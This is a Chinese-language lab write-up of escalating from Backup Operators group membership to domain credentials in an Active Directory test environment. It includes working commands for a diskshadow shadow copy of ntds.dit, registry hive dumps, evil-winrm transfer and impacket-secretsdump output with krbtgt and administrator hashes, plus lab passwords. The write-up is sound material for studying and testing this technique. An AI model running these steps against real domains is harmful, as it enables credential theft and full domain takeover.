<span style="font-size: 40px; font-weight: bold;">实验-备份操作员组</span>

<div style="text-align: right;">

date: "2023-01-08"

</div>

# 实验环境

域内机器

| 机器账户名称 | 机器型号      | IP            |
| ------------ | ------------- | ------------- |
| Web          | Win10         | 192.168.130.4 |
| DC           | WinServer2012 | 192.168.130.3 |

域内账号

| 域成员     | 域成员账号    | 域成员密码 |
| ---------- | ------------- | ---------- |
| 域管理员   | Administrator | t1sts@yyds |
| 域普通用户 | h0ny          | hony@yyd44 |

# 添加用户至备份操作员组

将上述创建的域用户 t1sts 用户添加至 Backup Operators（备份操作员组），并查看 Backup Operators 的所有成员

```shell
PS C:\Users\Administrator> Add-ADGroupMember -Identity "Backup Operators" -Members "h0ny"
PS C:\Users\Administrator> Get-ADGroupMember -Identity 'Backup Operators'


distinguishedName : CN=h0ny,CN=Users,DC=t1sts,DC=com
name              : h0ny
objectClass       : user
objectGUID        : 6c6671ff-6e5d-4bba-bcdc-19994ce27d73
SamAccountName    : h0ny
SID               : S-1-5-21-2484573369-1704761021-599324875-1107

```

# 登陆测试

本地登录测试：使用 h0ny 以本地登录方式登录域控，登陆成功


远程登录测试：使用 h0ny 以远程桌面方式登录域控，失败。提示：**连接被拒绝，因为没有授权此用户账户进行远程登录**

# 横向移动测试

```shell

┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-wmiexec t1sts/h0ny:"hony@yyd4"@192.168.130.3 -codec gbk
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv2.1 dialect used
[-] rpc_s_access_denied

┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-wmiexec t1sts/administrator:"t1sts@yyds"@192.168.130.3 -codec gbk
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
t1sts\administrator

C:\>

```

# 实验一：BackupOperatorToolkit or BackupOperatorToDA（失败）

> 使用 `BackupOperatorToolkit` 和 `BackupOperatorToDA` 尝试提权，原理也就是利用 `Backup Operators` 组成员导出域控上的 `SAM` `SECURITY` `SYSTEM` 三个存储凭证的文件，将其转储到攻击机（非域控机器）下，然后离线读取 `SAM` 文件，转储 `NTDS` 文件

将 h0ny 账号添加进 `Backup Operators`（备份操作员组）

```shell
C:\Users\Administrator\Desktop>net localgroup "Backup Operators" h0ny /add /domain
命令成功完成。

C:\Users\Administrator\Desktop>net localgroup "Backup Operators" /domain
别名     Backup Operators
注释     备份操作员为了备份或还原文件可以替代安全限制

成员

---------------------------------------------------------------------------
h0ny
命令成功完成。

```

两个工具分别都失败

```shell
C:\Users\h0ny\Desktop>BackupOperatorToolkit.exe DUMP \\192.168.130.4\share\ \\DC.t1sts.com
DUMP MODE
[+] Connecting to registry hive
[+] hive: SAM
[+] Dumping hive to \\192.168.130.4\share\
RegSaveKeyA: 5
```

```shell
C:\Users\h0ny\Desktop>BackupOperatorToDA.exe -t \\DC.t1sts.com -u h0ny -p hony@yyd4 -d t1sts.com -o \\WEB.t1sts.com\share\
Making user token
Dumping SAM hive to \\WEB.t1sts.com\share\SAM
RegSaveKeyA: 5
```

当前机器已开启 share 文件夹匿名访问

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ ./nxc smb 192.168.130.4 -u ' ' -p ' ' --shares
SMB         192.168.130.4   445    WEB              [*] Windows 10.0 Build 19041 x64 (name:WEB) (domain:t1sts.com) (signing:False) (SMBv1:False)
SMB         192.168.130.4   445    WEB              [+] t1sts.com\ :
SMB         192.168.130.4   445    WEB              [*] Enumerated shares
SMB         192.168.130.4   445    WEB              Share           Permissions     Remark
SMB         192.168.130.4   445    WEB              -----           -----------     ------
SMB         192.168.130.4   445    WEB              ADMIN$                          远程管理
SMB         192.168.130.4   445    WEB              C$                              默认共享
SMB         192.168.130.4   445    WEB              IPC$            READ            远程 IPC
SMB         192.168.130.4   445    WEB              share           READ,WRITE
```

根据工具作者的回复为 `远程共享上的访问被拒绝`，以上命令行均为 WEB 机器 h0ny 账号登录进行操作，也就是以 `Backup Operators` 组成员使用非域控机器进行操作

# 实验二：WinRM（成功）

> 一般用于后渗透权限维持

前提：

1. 拥有一个域成员账号，且该账号拥有 `SeBackupPrivilege` 和 `SeRestorePrivilege` 权限，或者是 `Backup Operators` 组内成员，因为该组内的成员默认分配以上两个权限
2. 该账号需要是 `Remote Management Users`(WinRM) 或 `Remote Desktop Users`(RDP) 组内成员，否则它无法将 RDP 或 WinRM 发送到计算机
3. 由于 `UAC用户账户控制` 提供的本地账户 token 过滤策略 `LocalAccountTokenFilterPolicy`，`backup operators` 组显示被禁用了：远程登录时剥夺任何本地帐户的管理权限。即使通过图形用户会话中的 `UAC` 提升您的权限，但在使用 WinRM 远程登录时，您被限制在没有管理权限的有限访问 token 中。

在本地测试环境中解决上面三个问题

```shell
# 将 h0ny 添加至 Backup Operators
net localgroup "Backup Operators" h0ny /add

# 将 h0ny 添加至 Remote Management Users
net localgroup "Remote Management Users" h0ny /add

# 更改注册表，禁用 LocalAccountTokenFilterPolicy 策略
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

使用 `diskshadow` 导出 `ntds.dit`。将以下 `diskshadow` 命令保存在一个文本文件中

```shell
# Set the context to persistent and disable writers
set context persistent nowriters

# Add the C: volume with an alias of "someAlias"
add volume c: alias someAlias

# Create a shadow copy of the volume
create

# Expose the shadow copy as the Z: drive
expose %someAlias% z:

# Execute the backup script or command (absolute path !!!)
# Here, we are using Robocopy in backup mode to copy the NTDS directory from the shadow copy to the C:\temp directory
exec C:\Windows\System32\Robocopy.exe /b z:\Windows\NTDS\ c:\temp\ ntds.dit

# Unexpose the Z: drive
unexpose z:

# Delete the shadow copy
delete shadows volume %someAlias%

# Reset the diskshadow environment
reset

# Exit diskshadow
exit
```

> 注：如果你是使用的 Linux，还需要使用 `unix2dos` 命令将文件的编码和间距转换为 Windows 兼容的编码和间距。

```shell
*Evil-WinRM* PS C:\Users\h0ny\Documents> cd c:/temp
*Evil-WinRM* PS C:\temp> upload /home/kali/Desktop/test.txt
Info: Uploading /home/kali/Desktop/test.txt to C:\temp\test.txt


Data: 956 bytes of 956 bytes copied

Info: Upload successful!
```

使用 `evil-winrm` 上传文件到目标服务器后，使用 `diskshadow` 脚本模式，执行包含 `diskshadow` 命令的文件：

```shell
*Evil-WinRM* PS C:\temp> diskshadow /s ./test.txt
Microsoft DiskShadow 版本 1.0
版权所有 (C) 2012 Microsoft Corporation
在计算机上: DC，2023/12/22 22:00:14

-> # Set the context to persistent and disable writers
-> set context persistent nowriters
->
-> # Add the C: volume with an alias of "someAlias"
-> add volume c: alias someAlias
->
-> # Create a shadow copy of the volume
-> create
已将卷影 ID {f6b89ba9-7ef2-433b-ba9f-bac30a7060b3} 的别名 someAlias 设置为环境变量。
已将卷影集 ID {d6ed62ad-3880-45b5-8384-d85b1658a28c} 的别名 VSS_SHADOW_SET 设置为环境变量。

正在查询卷影副本集 ID 为 {d6ed62ad-3880-45b5-8384-d85b1658a28c} 的所有卷影副本

        * 卷影副本 ID = {f6b89ba9-7ef2-433b-ba9f-bac30a7060b3}          %someAlias%
                - 卷影副本集: {d6ed62ad-3880-45b5-8384-d85b1658a28c}    %VSS_SHADOW_SET%
                - 卷影副本原始数 = 1
                - 原始卷名称: \\?\Volume{c2971e46-764e-11ee-93e7-806e6f6e6963}\ [C:\]
                - 创建时间: 2023/12/22 22:00:15
                - 卷影副本设备名称: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - 原始计算机: DC.t1sts.com
                - 服务计算机: DC.t1sts.com
                - 未暴露
                - 提供程序 ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - 属性:  No_Auto_Release Persistent No_Writers Differential

已列出的卷影副本数: 1
->
-> # Expose the shadow copy as the Z: drive
-> expose %someAlias% z:
-> %someAlias% = {f6b89ba9-7ef2-433b-ba9f-bac30a7060b3}
已成功将卷影副本暴露为 z:\。
->
-> # Execute the backup script or command (absolute path !!!)
-> # Here, we are using Robocopy in backup mode to copy the NTDS directory from the shadow copy to the C:\temp directory
-> exec C:\Windows\System32\Robocopy.exe /b z:\Windows\NTDS\ c:\temp\ ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Windows 的可靠文件复制
-------------------------------------------------------------------------------

  开始时间: 2023年12月22日 22:00:15
        源: z:\Windows\NTDS\
      目标: c:\temp\

      文件: ntds.dit

      选项: /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\Windows\NTDS\
            新文件                18.0 m        ntds.dit

------------------------------------------------------------------------------

                  总数        复制        跳过       不匹配        失败        其他
       目录:         1         0         0         0         0         0
       文件:         1         1         0         0         0         0
       字节:   18.01 m   18.01 m         0         0         0         0
       时间:   0:00:00   0:00:00                       0:00:00   0:00:00


       速度:           309684459 字节/秒。
       速度:           17720.286 MB/分钟。
   结束时间: 2023年12月22日 22:00:15

命令脚本已返回故障退出代码 1。
命令脚本失败。
```

> 注：此处 `ntds.dit` 已经通过影卷拷贝到 C 盘的 temp 下了，执行失败是因为取消 Z 盘的影卷副本出错了，后续手动取消一下即可，对后续的下载 `ntds.dit` 到本地解密无影响

```shell
*Evil-WinRM* PS C:\temp> dir


    Directory: C:\temp


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---        12/22/2023  10:00 PM        713 22-2023-12_-00-15_DC.cab
-a---        12/21/2023   8:45 PM   18890752 ntds.dit
-a---        12/22/2023   9:59 PM        718 test.txt
-a---        12/22/2023  10:25 PM        173 test1.txt
```

转储注册表 `bak` 和 `ntds.dit` 文件

```shell
*Evil-WinRM* PS C:\temp> reg save hklm\system system.bak
操作成功完成。

*Evil-WinRM* PS C:\temp> reg save hklm\sam sam.bak
操作成功完成。

*Evil-WinRM* PS C:\temp> download ntds.dit
Info: Downloading ntds.dit to ./ntds.dit


Info: Download successful!

*Evil-WinRM* PS C:\temp> download system.bak
Info: Downloading system.bak to ./system.bak


Info: Download successful!

*Evil-WinRM* PS C:\temp> download sam.bak
Info: Downloading sam.bak to ./sam.bak


Info: Download successful!


```

使用 `secretsdump ` 对其进行解密

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-secretsdump -ntds ntds.dit -sam sam.bak -system system.bak LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x5f6548faaf91bfa2eb591c91ede88cff
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 704d92f384ec93bcf18eb0aadb4d6a07
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1001:aad3b435b51404eeaad3b435b51404ee:e091f2c3b12cc51ef476c641baa9abc2:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:350ddfc950fb2b3731e6e2b23c047dbf:::
[*] Kerberos keys from ntds.dit
DC$:aes256-cts-hmac-sha1-96:7ebd812f5dc9d8a3ed5666b1cb67c4f51635315276f46a4637f98baa001a9be6
DC$:aes128-cts-hmac-sha1-96:5ab5ba2996984f99c6de6afb48421372
DC$:des-cbc-md5:980dbca291439440
krbtgt:aes256-cts-hmac-sha1-96:49a036ce6b94a6cd56eb3950abe71caa7fdf15e4d40a8b5d235963dab91267b5
krbtgt:aes128-cts-hmac-sha1-96:5782662a0d7c501c2708e06c9252f325
krbtgt:des-cbc-md5:ad830e4a29b5c264
[*] Cleaning up...
```

